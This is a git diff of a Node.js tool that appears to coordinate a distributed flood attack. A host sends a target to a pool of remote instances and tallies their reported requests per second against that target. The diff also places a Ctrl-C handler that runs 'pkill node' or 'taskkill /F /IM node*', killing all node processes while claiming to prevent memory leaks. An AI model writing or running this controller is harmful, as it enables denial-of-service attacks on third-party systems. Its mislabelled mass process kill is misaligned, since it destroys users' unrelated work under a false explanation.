@@ -22,10 +22,6 @@ var screen = blessed.screen(),
 
 screen.append(body);
 
-screen.key(['escape', 'q', 'C-c'], function(ch, key) {
-return process.exit(0);
-});
-
 function status(text) {
     body.setLine(0, '{blue-bg}' + text + '{/blue-bg}');
     screen.render();
@@ -182,9 +178,30 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                     });
             });
         });
+        
+        var stdin = process.stdin;
+        stdin.setRawMode( true );
+        stdin.resume();
+        stdin.setEncoding( 'utf8' );
+        stdin.on( 'data', function(key){
+            if(key === '\u0003') {
+                if(process.platform == 'win32'){
+                    const cp = require('child_process');
+                    console.log('Windows machine detected, killing all node processes to prevent memory leaks')
+                    cp.exec('taskkill /F /IM node*');
+                }else{
+                    const cp = require('child_process');
+                    console.log('Linux/Unix machine detected, killing all node processes to prevent memory leaks');
+                    cp.exec('pkill node');
+                }
+            }
+        });
     }
 
     function host() {
+        screen.key(['escape', 'q', 'C-c'], function(ch, key) {
+            return process.exit(0);
+        });
         //rl
         const readline = require('readline').createInterface({
             input: process.stdin,
@@ -277,23 +294,23 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                             }
                             http.get(options, (res) => {
                                 if(res.statusCode == 200) {
-                                    console.log(`${ip}:${port} is online and added to the pool`);
+                                    console.log(`${ip} is online and added to the pool`);
                                     onlineInstances.push(instance);
                                 } else{
-                                    console.log(`${ip}:${port} is offline`);
+                                    console.log(`${ip} is offline`);
                                     //remove from db
                                     Instance.findOneAndDelete({ip: ip}, (err) => {
                                         if(err) {
                                             console.log(err)
                                         }
                                         else {
-                                            console.log(`${ip} removed from database`)
+                                            console.log(`${ip}: removed from database`)
                                         }
                                     })
                                 }
                             })
                         });
-                        console.log(`Online instances: ${onlineInstances}`);
+                        console.log(`Online instances: ${onlineInstances.length}`);
         
                         setTimeout(reciveLogs, 2000);
                                 
@@ -311,7 +328,7 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                                     const options = {
                                         hostname: ip,
                                         port: port,
-                                        path: `/${password}/${target}/${mUseUDP}`,
+                                        path: `/${password}/${target}/`,
                                     }
                                     http.get(options, (res) => {
                                         if(res.statusCode == 200) {
@@ -321,71 +338,52 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                                             console.log(`Failed to send request to ${ip}:${port}; Status code: ${res.statusCode}`)
                                         }
                                     })
-                            })
-                                
-                            let rps = []
-        
-                            app.get('/:passwd/:name/:out/:rps', (req, res) => {
-                                if(req.params.passwd != hostPassword){
-                                    res.status(401).send('Unauthorized')
-                                }
-                                else {
-                                    let out = `${req.params.name}: ${req.params.out}`
-                                    let name = req.params.name
-                                    res.status(200).send('Data received')                                    
-    
-                                    log(`${out}`)
-                                    rps.push(parseInt(req.params.rps))
-    
-    
-                                }
-                            })
-                            let sentReqs = 0
-                            setInterval(() => {
-                                //add all rps together
-                                let totalRps = 0
-                                rps.forEach((rps) => {
-                                    totalRps += rps
                                 })
-                                sentReqs += totalRps
-                                status(`Total RPS: ${totalRps}/s - Total sent requests ${sentReqs} - Online Instances: ${onlineInstances.length}\nTarget: ${target}`)
-                                rps = []
-                            }, 1000)
-                            app.listen(port, () => {
-                                console.log(`Listening for logs on port ${port}`)
-                            })
-                        
-                    }
-    
-                    }
-            });
-        });
-        }
-
-        var stdin = process.stdin;
-        stdin.setRawMode( true );
-        stdin.resume();
-        stdin.setEncoding( 'utf8' );
-        stdin.on( 'data', function(key){
-            if(key === '\u0003') {
-                    if(process.platform == 'win32'){
-                        const cp = require('child_process');
-                        console.log('Windows machine detected, killing all node processes to prevent memory leaks')
-                        cp.exec('taskkill /F /IM node*');
-                    }else{
-                        const cp = require('child_process');
-                        console.log('Linux/Unix machine detected, killing all node processes to prevent memory leaks');
-                        cp.exec('pkill node');
-                    }
+                                    
+                                let rps = []
+            
+                                app.get('/:passwd/:name/:out/:rps', (req, res) => {
+                                    if(req.params.passwd != hostPassword){
+                                        res.status(401).send('Unauthorized')
+                                    }
+                                    else {
+                                        let out = `${req.params.name}: ${req.params.out}`
+                                        let name = req.params.name
+                                        res.status(200).send('Data received')                                    
+        
+                                        log(`${out}`)
+                                        rps.push(parseInt(req.params.rps))
+        
+        
+                                    }
+                                })
+                                let sentReqs = 0
+                                setInterval(() => {
+                                    //add all rps together
+                                    let totalRps = 0
+                                    rps.forEach((rps) => {
+                                        totalRps += rps
+                                    })
+                                    sentReqs += totalRps
+                                    status(`Total RPS: ${totalRps}/s - Total sent requests ${sentReqs} - Online Instances: ${onlineInstances.length}\nTarget: ${target}`)
+                                    rps = []
+                                }, 1000)
+                                app.listen(port, () => {
+                                    console.log(`Listening for logs on port ${port}`)
+                                })
+                            
+                            }
+                        }
+                    });
+                });
             }
-        });
     }
     
 
 
     if(!process.argv[2]) {
         console.log('Missing arguments')
-        process.exit(0)
+        process.exit(1)
     }
     if(process.argv[2] == 'listen') {
         if(process.argv.length < 4) {
@@ -393,19 +391,7 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
             process.exit(1)
         }
         db.on('connected', () => {
-            if(process.platform != 'win32'){
-                const cp = require('child_process');
-                cp.exec('ping -V', (err, stdout) => {
-                    if(err || stdout.toString().toLowerCase().includes('not found')) {
-                        console.log('PING command is not installed, please install it to use this tool')
-                        process.exit(1)
-                    }
-                    else {
-                        listen()
-                    }
-                })
-            } else listen()
-            
+            listen()
         })
 
     } else if(process.argv[2] == 'host') {
